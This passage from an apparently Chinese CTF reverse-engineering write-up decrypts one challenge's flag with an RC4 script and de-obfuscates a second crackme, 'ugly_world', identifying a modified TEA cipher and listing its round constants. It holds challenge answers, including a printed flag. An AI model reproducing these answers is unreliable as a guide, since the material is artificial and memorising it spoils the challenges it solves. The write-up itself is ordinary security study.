class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + S[i] + key[i % <span class="hljs-built_in">len</span>(key)]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br><br>    i = j = <span class="hljs-number">0</span><br>    plain = []<br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> cipher:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + S[i]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>        K = S[(S[i] + S[j]) % <span class="hljs-number">256</span>]<br><br>        plain.append(c ^ K ^ <span class="hljs-number">100</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(plain)<br><br>cipher = [<br>    <span class="hljs-number">0xf8</span>, <span class="hljs-number">0xb1</span>, <span class="hljs-number">0x1e</span>, <span class="hljs-number">0xe8</span>, <span class="hljs-number">0x7f</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0xde</span>, <span class="hljs-number">0x4e</span>,<br>    <span class="hljs-number">0x84</span>, <span class="hljs-number">0xb4</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0xb6</span>, <span class="hljs-number">0x8e</span>, <span class="hljs-number">0xd1</span>, <span class="hljs-number">0x2a</span>,<br>    <span class="hljs-number">0x8b</span>, <span class="hljs-number">0x9a</span>, <span class="hljs-number">0x4d</span>, <span class="hljs-number">0xe7</span>, <span class="hljs-number">0x8f</span>, <span class="hljs-number">0xda</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0xc0</span>,<br>    <span class="hljs-number">0xa9</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0xe7</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x88</span>,<br>    <span class="hljs-number">0x77</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xba</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0xc6</span>, <span class="hljs-number">0xb0</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x24</span>,<br>    <span class="hljs-number">0xa6</span>, <span class="hljs-number">0xa8</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0xcd</span>, <span class="hljs-number">0x9c</span>, <span class="hljs-number">0x8a</span>, <span class="hljs-number">0x32</span><br>]<br><br>key_str = <span class="hljs-string">&quot;doyouknowcsharp&quot;</span><br>flag = rc4_cccc_dec(cipher,key_str)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Flag is :&quot;</span>,flag)<br></code></pre></td></tr></table></figure><p>flag 为 <code>flag&#123;y0u_r34lly_kn0w_m@ny_pr0gr@mm1ng_l@ngu@g3$&#125;</code></p><h3 id="ugly-world"><a href="#ugly-world" class="headerlink" title="ugly_world"></a>ugly_world</h3><h4 id="处理混淆-1"><a href="#处理混淆-1" class="headerlink" title="处理混淆"></a>处理混淆</h4><p>main 函数初看很简单</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> a1, <span class="hljs-type">char</span> **a2, <span class="hljs-type">char</span> **a3)</span><br>&#123;<br>  _BYTE input[<span class="hljs-number">104</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-70h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v5; <span class="hljs-comment">// [rsp+68h] [rbp-8h]</span><br><br>  v5 = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;please input your flag:&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%40s&quot;</span>, input);<br>  sub_55555555E656((__int64)input, (__int64)&amp;qword_555555561020);<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int8)sub_55555555E6A4(input, &amp;byte_555555561040) )<br>    sub_55555555E705();<br>  <span class="hljs-keyword">else</span><br>    sub_55555555E71F();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>读取了用户输入，sub_55555555E656 对 input 和地址 555555561020 处的数据(0x5566778811223344,0xCCDDEEFF9900AABB)进行处理，sub_55555555E656 函数中是一个循环，其中的 sub_555555555401 是一个很大的经过混淆了的函数,byte_555555561040 的位置是密文 <code>0x0BD3BE58, 0xBE73BBFB, 0xC8C8AF4E, 0x0B3C7D86, 0xC0257C09, 0x1D8FE0B0, 0x8837180C, 0xF5CF9D23, 0xB7A8B599，0xAE630F3D</code>,sub_55555555E705 输出 your are right!,else 输出 you are wrong!</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">sub_55555555E656</span><span class="hljs-params">(__int64 a1, __int64 a2)</span><br>&#123;<br>  __int64 result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+1Ch] [rbp-4h]</span><br><br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">9</span>; i += <span class="hljs-number">2</span> )<br>    result = sub_555555555401((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *)(a1 + <span class="hljs-number">4LL</span> * i), a2);<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>对 sub_555555555401 中的函数逐个分析<br><strong>sub_189 -&gt; a1 + a2 -&gt; ADD</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">sub_555555555189</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> a1, <span class="hljs-type">int</span> a2)</span><br>&#123;<br>  <span class="hljs-type">int</span> v5;<br><br>  <span class="hljs-keyword">while</span> (a2)<br>  &#123;<br>    v5 = <span class="hljs-number">2</span> * (a2 &amp; a1); <span class="hljs-comment">// 计算进位</span><br>    a1 ^= a2;           <span class="hljs-comment">// 无进位加法 (异或)</span><br>    a2 = v5;            <span class="hljs-comment">// 更新进位</span><br>  &#125;<br>  <span class="hljs-keyword">return</span> a1;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>sub_1BB -&gt; a1 - a2 -&gt; SUB</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">sub_5555555551BB</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> a1, <span class="hljs-type">int</span> a2)</span><br>&#123;<br>  <span class="hljs-type">int</span> v3; <br><br>  v3 = ADD(~a2, <span class="hljs-number">1</span>);   <span class="hljs-comment">// 计算 -a2</span><br>  <span class="hljs-keyword">return</span> ADD(a1, v3); <span class="hljs-comment">// a1 + (-a2)</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>sub_2BF -&gt; a1 &gt;&gt; a2 -&gt; SHR</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">sub_5555555552BF</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> a1, <span class="hljs-type">signed</span> <span class="hljs-type">int</span> a2)</span><br>&#123;<br>  <span class="hljs-type">signed</span> <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+14h] [rbp-4h]</span><br><br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; a2; i = ADD(i, <span class="hljs-number">1</span>) )<br>    a1 = SUB(a1 &amp; <span class="hljs-number">0xFFFFFFFE</span>, (<span class="hljs-type">int</span>)(a1 &amp; <span class="hljs-number">0xFFFFFFFE</span>) / <span class="hljs-number">2</span>);<br>  <span class="hljs-keyword">return</span> a1;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>sub_336 -&gt; 把内存里连续的 4 个字节，拼成一个 小端序的 32 位整数 -&gt; byte2dword</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">sub_555555555366</span><span class="hljs-params">(__int64 a1, <span class="hljs-type">int</span> a2)</span><br>&#123;<br>  <span class="hljs-keyword">return</span> <br>      (*(<span class="hljs-type">unsigned</span> __int8 *)(<span class="hljs-number">4</span> * a2 + <span class="hljs-number">1LL</span> + a1) &lt;&lt; <span class="hljs-number">8</span>)  |  <span class="hljs-comment">// 第2个字节 → &lt;&lt;8</span><br>      (*(<span class="hljs-type">unsigned</span> __int8 *)(<span class="hljs-number">4</span> * a2 + <span class="hljs-number">2LL</span> + a1) &lt;&lt; <span class="hljs-number">16</span>) |  <span class="hljs-comment">// 第3个字节 → &lt;&lt;16</span><br>      (*(<span class="hljs-type">unsigned</span> __int8 *)(<span class="hljs-number">4</span> * a2 + <span class="hljs-number">3LL</span> + a1) &lt;&lt; <span class="hljs-number">24</span>) |  <span class="hljs-comment">// 第4个字节 → &lt;&lt;24</span><br>      (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)*(<span class="hljs-type">unsigned</span> __int8 *)(<span class="hljs-number">4</span> * a2 + a1);  <span class="hljs-comment">// 第1个字节 (低8位)</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>sub_31A -&gt; a1 &lt;&lt; a2 -&gt; SHL</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">sub_55555555531A</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> a1, <span class="hljs-type">int</span> a2)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i; <br><br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; (<span class="hljs-type">int</span>)i &lt; a2; i = ADD(i, <span class="hljs-number">1LL</span>) )<br>    a1 = ADD(a1, a1);<br>  <span class="hljs-keyword">return</span> a1;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>sub_1F2 -&gt; (a1 ^ a2) &amp; 1 -&gt; XOR1</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">sub_5555555551F2</span><span class="hljs-params">(<span class="hljs-type">char</span> a1, <span class="hljs-type">char</span> a2)</span><br>&#123;<br>  <span class="hljs-keyword">return</span> (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)(((a1 &amp; <span class="hljs-number">1</span>) + (a2 &amp; <span class="hljs-number">1</span>)) % <span class="hljs-number">2</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>sub_21D -&gt; a1 ^ a2 -&gt; XOR</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs C">__int64 __fastcall <span class="hljs-title function_">sub_55555555521D</span><span class="hljs-params">(<span class="hljs-type">int</span> a1, <span class="hljs-type">int</span> a2)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v5 = <span class="hljs-number">0</span>;<br>  <span class="hljs-type">int</span> i;<br><br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">31</span>; ++i )<br>  &#123;<br>    <span class="hljs-type">int</span> v7 = XOR1((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)a1, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)a2); <span class="hljs-comment">// 取最低位异或</span><br>    v5 = ADD(v5, v7 &lt;&lt; i);                             <span class="hljs-comment">// 累加到结果的第 i 位</span><br>    a1 &gt;&gt;= <span class="hljs-number">1</span>;                                          <br>    a2 &gt;&gt;= <span class="hljs-number">1</span>;                                          <br>  &#125;<br>  <span class="hljs-keyword">return</span> v5;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>sub_28B -&gt; (a1 ^ a2 ^ a3) -&gt; XOR3</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">sub_55555555528B</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> a1, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> a2, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> a3)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v3; <span class="hljs-comment">// eax</span><br><br>  v3 = XOR(a1, a2);<br>  <span class="hljs-keyword">return</span> XOR(v3, a3);<br>&#125;<br></code></pre></td></tr></table></figure><p>修改之后反编译界面如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs c">m0 = *input;<br>m1 = input[<span class="hljs-number">1</span>];<br><span class="hljs-comment">//循环1</span><br>o1 = ADD(<span class="hljs-number">0</span>, <span class="hljs-number">0x3CA6F3E</span>);<br>k1 = byte2dword(a2, <span class="hljs-number">1</span>);                       <br>v3 = SHR(m1, <span class="hljs-number">1</span>);                              <br>v4 = ADD(v3, k1);                           <br>v5 = ADD(m1, o1);                            <br>k2 = byte2dword(a2, <span class="hljs-number">0</span>);                      <br>v7 = SHL(m1, <span class="hljs-number">1</span>);                            <br>v8 = ADD(v7, k2);                            <br>v9 = XOR3(v8, v5, v4);                       <br>j = ADD(m0, v9);                             <br>k3 = byte2dword(a2, <span class="hljs-number">3</span>);                       <br>v11 = SHR(j, <span class="hljs-number">1</span>);                              <br>v12 = ADD(v11, k3);                           <br>v13 = ADD(j, o1);                             <br>v14 = byte2dword(a2, <span class="hljs-number">2</span>);                      <br>v15 = SHL(j, <span class="hljs-number">1</span>);                              <br>v16 = ADD(v15, v14);<br>v17 = XOR3(v16, v13, v12);<br>o2 = ADD(m1, v17);<br><span class="hljs-comment">//循环2</span><br>c2 = ADD(o1, <span class="hljs-number">0xF2E1C7F1</span>);<br>v18 = byte2dword(a2, <span class="hljs-number">1</span>);<br>v19 = SHR(o2, <span class="hljs-number">3</span>);<br>v20 = ADD(v19, v18);<br>v21 = ADD(o2, c2);<br>v22 = byte2dword(a2, <span class="hljs-number">0</span>);<br>v23 = SHL(o2, <span class="hljs-number">4</span>);<br>v24 = ADD(v23, v22);<br>v25 = XOR3(v24, v21, v20);<br>m0a = ADD(j, v25);<br>v26 = byte2dword(a2, <span class="hljs-number">3</span>);<br>v27 = SHR(m0a, <span class="hljs-number">3</span>);<br>v28 = ADD(v27, v26);<br>v29 = ADD(m0a, c2);<br>v30 = byte2dword(a2, <span class="hljs-number">2</span>);<br>v31 = SHL(m0a, <span class="hljs-number">4</span>);<br>v32 = ADD(v31, v30);<br>v33 = XOR3(v32, v29, v28);<br>m1a = ADD(o2, v33);<br><span class="hljs-comment">//循环3</span><br>o1a = ADD(c2, <span class="hljs-number">2040670275</span>);<br>v34 = byte2dword(a2, <span class="hljs-number">1</span>);<br>v35 = SHR(m1a, <span class="hljs-number">4</span>);<br>v36 = ADD(v35, v34);<br>v37 = ADD(m1a, o1a);<br>v38 = byte2dword(a2, <span class="hljs-number">0</span>);<br>v39 = SHL(m1a, <span class="hljs-number">6</span>);<br>v40 = ADD(v39, v38);<br>v41 = XOR3(v40, v37, v36);<br>m0b = ADD(m0a, v41);<br>v42 = byte2dword(a2, <span class="hljs-number">3</span>);<br>v43 = SHR(m0b, <span class="hljs-number">4</span>);<br>v44 = ADD(v43, v42);<br>v45 = ADD(m0b, o1a);<br>v46 = byte2dword(a2, <span class="hljs-number">2</span>);<br>v47 = SHL(m0b, <span class="hljs-number">6</span>);<br>v48 = ADD(v47, v46);<br>v49 = XOR3(v48, v45, v44);<br>m1b = ADD(m1a, v49);<br><span class="hljs-comment">//循环4</span><br>o1b = ADD(o1a, <span class="hljs-number">-729809763</span>);<br>v50 = byte2dword(a2, <span class="hljs-number">1</span>);<br>v51 = SHR(m1b, <span class="hljs-number">3</span>);<br>v52 = ADD(v51, v50);<br>v53 = ADD(m1b, o1b);<br>v54 = byte2dword(a2, <span class="hljs-number">0</span>);<br>v55 = SHL(m1b, <span class="hljs-number">6</span>);<br>v56 = ADD(v55, v54);<br>v57 = XOR3(v56, v53, v52);<br>m0c = ADD(m0b, v57);<br>v58 = byte2dword(a2, <span class="hljs-number">3</span>);<br>v59 = SHR(m0c, <span class="hljs-number">3</span>);<br>v60 = ADD(v59, v58);<br>v61 = ADD(m0c, o1b);<br>v62 = byte2dword(a2, <span class="hljs-number">2</span>);<br>v63 = SHL(m0c, <span class="hljs-number">6</span>);<br>v64 = ADD(v63, v62);<br>v65 = XOR3(v64, v61, v60);<br>m1c = ADD(m1b, v65);<br>...<br>*input = m0ew;<br>result = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)result;<br>input[<span class="hljs-number">1</span>] = result;<br><span class="hljs-keyword">return</span> result;<br></code></pre></td></tr></table></figure><h4 id="加密同构"><a href="#加密同构" class="headerlink" title="加密同构"></a>加密同构</h4><p>梳理第一个循环结构一下可以得到</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs py">m0 = <span class="hljs-built_in">input</span>[<span class="hljs-number">0</span>]<br>m1 = <span class="hljs-built_in">input</span>[<span class="hljs-number">1</span>]<br>c1 = <span class="hljs-number">0x3CA6F3E</span><br>k1 = <span class="hljs-number">0x55667788</span><br>v3 = m1 &gt;&gt; <span class="hljs-number">1</span><br>v4 = (m1 &gt;&gt; <span class="hljs-number">1</span>) + k1<br>v5 = m1 + <span class="hljs-number">0x3CA6F3E</span><br>k2 = <span class="hljs-number">0x11223344</span><br>v7 = m1 &lt;&lt; <span class="hljs-number">1</span><br>v8 = (m1 &lt;&lt; <span class="hljs-number">1</span>) + k2<br>v9 = ((m1 &lt;&lt; <span class="hljs-number">1</span>) + k2) ^ (m1 + <span class="hljs-number">0x3CA6F3E</span>) ^ ((m1 &gt;&gt; <span class="hljs-number">1</span>) + k1)<br>o1 = m0 + v9<br>k3 = <span class="hljs-number">0xCCDDEEFF</span><br>v11 = o1 &gt;&gt; <span class="hljs-number">1</span><br>v12 = (o1 &gt;&gt; <span class="hljs-number">1</span>) + k3<br>v13 = o1 + k1<br>k4 = <span class="hljs-number">0x9900AABB</span><br>v15 = o1 &lt;&lt; <span class="hljs-number">1</span><br>v16 = (o1 &lt;&lt; <span class="hljs-number">1</span>) + k4<br>v17 = ((o1 &lt;&lt; <span class="hljs-number">1</span>) + k4) ^ (o1 + k1) ^ ((o1 &gt;&gt; <span class="hljs-number">1</span>) + k3)<br>o2 = m1 + v17<br></code></pre></td></tr></table></figure><p>可以看出这个这是一个魔改的 TEA，一共有 128 轮，每轮的 delta 都不一样，并且每轮左移右移的数也不一样<br>提取出每一轮的 delta 和 移位值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python">delta = [<br>    <span class="hljs-number">0x3CA6F3E</span>, <span class="hljs-number">0xF2E1C7F1</span>, <span class="hljs-number">0x79A22843</span>, <span class="hljs-number">0xD47FFC9D</span>, <span class="hljs-number">0xDD10F4C</span>, <span class="hljs-number">0x1DC368A1</span>, <span class="hljs-number">0x11B15F8A</span>, <span class="hljs-number">0x9469B3CD</span>, <br>    <span class="hljs-number">0x45D6DB5F</span>, <span class="hljs-number">0xBC6EE006</span>, <span class="hljs-number">0xA76D8146</span>, <span class="hljs-number">0xD542E337</span>, <span class="hljs-number">0x242E1155</span>, <span class="hljs-number">0xAA7F93DD</span>, <span class="hljs-number">0x88625ECB</span>, <span class="hljs-number">0x3738E499</span>, <br>    <span class="hljs-number">0xCEF27BB0</span>, <span class="hljs-number">0x134FF759</span>, <span class="hljs-number">0x358CA57E</span>, <span class="hljs-number">0x3461F310</span>, <span class="hljs-number">0x28540EE7</span>, <span class="hljs-number">0x81C0B176</span>, <span class="hljs-number">0xF725EE9C</span>, <span class="hljs-number">0xAF823A69</span>, <br>    <span class="hljs-number">0x61E8ECB3</span>, <span class="hljs-number">0xF4919548</span>, <span class="hljs-number">0x6AF44E11</span>, <span class="hljs-number">0x866162F3</span>, <span class="hljs-number">0x867F7E65</span>, <span class="hljs-number">0x6B26444C</span>, <span class="hljs-number">0x10216241</span>, <span class="hljs-number">0x9C1BA3CD</span>, <br>    <span class="hljs-number">0x1268FEAD</span>, <span class="hljs-number">0xF462B3B5</span>, <span class="hljs-number">0x5F7DE761</span>, <span class="hljs-number">0x72EAD5B6</span>, <span class="hljs-number">0xFBCE0C75</span>, <span class="hljs-number">0x44EF4142</span>, <span class="hljs-number">0x54DCC3C0</span>, <span class="hljs-number">0xAFFE805D</span>, <br>    <span class="hljs-number">0xC8833729</span>, <span class="hljs-number">0x3C944186</span>, <span class="hljs-number">0x261169A</span>, <span class="hljs-number">0xB547EA2F</span>, <span class="hljs-number">0x9B499585</span>, <span class="hljs-number">0xFE0190BF</span>, <span class="hljs-number">0x1EC74BE7</span>, <span class="hljs-number">0xAFC9292E</span>, <br>    <span class="hljs-number">0xC32F4EEF</span>, <span class="hljs-number">0x420A1A4</span>, <span class="hljs-number">0x94BEAB2B</span>, <span class="hljs-number">0xA0693238</span>, <span class="hljs-number">0x4DD5ADC1</span>, <span class="hljs-number">0x9F658F31</span>, <span class="hljs-number">0x1732EA46</span>, <span class="hljs-number">0x76BEE7DD</span>, <br>    <span class="hljs-number">0x12C63095</span>, <span class="hljs-number">0x9C202C7C</span>, <span class="hljs-number">0xAC9BB4C4</span>, <span class="hljs-number">0x1762AEAF</span>, <span class="hljs-number">0xCA41991E</span>, <span class="hljs-number">0xC0480F85</span>, <span class="hljs-number">0xBF534431</span>, <span class="hljs-number">0xF1C2780E</span>, <br>    <span class="hljs-number">0x990A7D6F</span>, <span class="hljs-number">0x69D22B81</span>, <span class="hljs-number">0x34DDECDE</span>, <span class="hljs-number">0x11ECD8F8</span>, <span class="hljs-number">0x22BB55D2</span>, <span class="hljs-number">0xFFA55B0</span>, <span class="hljs-number">0x6CC1AFBF</span>, <span class="hljs-number">0xA5610F61</span>, <br>    <span class="hljs-number">0x13190C95</span>, <span class="hljs-number">0xE09A5D29</span>, <span class="hljs-number">0xE7514731</span>, <span class="hljs-number">0x9AE21D7A</span>, <span class="hljs-number">0xB8D90F5A</span>, <span class="hljs-number">0x4C7299A9</span>, <span class="hljs-number">0xC4FDB94E</span>, <span class="hljs-number">0xA6475083</span>, <br>    <span class="hljs-number">0xBFB62E5</span>, <span class="hljs-number">0x8F7F77EB</span>, <span class="hljs-number">0xDA2568BB</span>, <span class="hljs-number">0x55C4DA9E</span>, <span class="hljs-number">0xC2932973</span>, <span class="hljs-number">0xCBC60B6D</span>, <span class="hljs-number">0xC46720FD</span>, <span class="hljs-number">0x2046D79D</span>, <br>    <span class="hljs-number">0x629CBD81</span>, <span class="hljs-number">0x932B1F48</span>, <span class="hljs-number">0x72ED29C0</span>, <span class="hljs-number">0xF4B566D3</span>, <span class="hljs-number">0xCBC53B21</span>, <span class="hljs-number">0x7836C87B</span>, <span class="hljs-number">0xBA4357B1</span>, <span class="hljs-number">0xCFD332E2</span>, <br>    <span class="hljs-number">0x4D488FCB</span>, <span class="hljs-number">0xA06DEFBF</span>, <span class="hljs-number">0x68211846</span>, <span class="hljs-number">0xC17F878D</span>, <span class="hljs-number">0x33B10E2C</span>, <span class="hljs-number">0xCFA0E756</span>, <span class="hljs-number">0x4C3C0691</span>, <span class="hljs-number">0x870BE107</span>, <br>    <span class="hljs-number">0x55B3FAF0</span>, <span class="hljs-number">0xFD39F8D7</span>, <span class="hljs-number">0x4B9A7795</span>, <span class="hljs-number">0x188CFA42</span>, <span class="hljs-number">0xAA79A09D</span>, <span class="hljs-number">0x620CF186</span>, <span class="hljs-number">0xEFDE898A</span>, <span class="hljs-number">0x2FA95D43</span>, <br>    <span class="hljs-number">0xD67359DB</span>, <span class="hljs-number">0x8625BC1B</span>, <span class="hljs-number">0x7A1A3BBC</span>, <span class="hljs-number">0xE6ECEF6C</span>, <span class="hljs-number">0xBA27A5C6</span>, <span class="hljs-number">0x559FE417</span>, <span class="hljs-number">0xF01DF04D</span>, <span class="hljs-number">0x3F910D52</span>, <br>    <span class="hljs-number">0x382B7BE</span>, <span class="hljs-number">0xAAECB195</span>, <span class="hljs-number">0x2E440D8E</span>, <span class="hljs-number">0xB3D58B0B</span>, <span class="hljs-number">0x3CA704B8</span>, <span 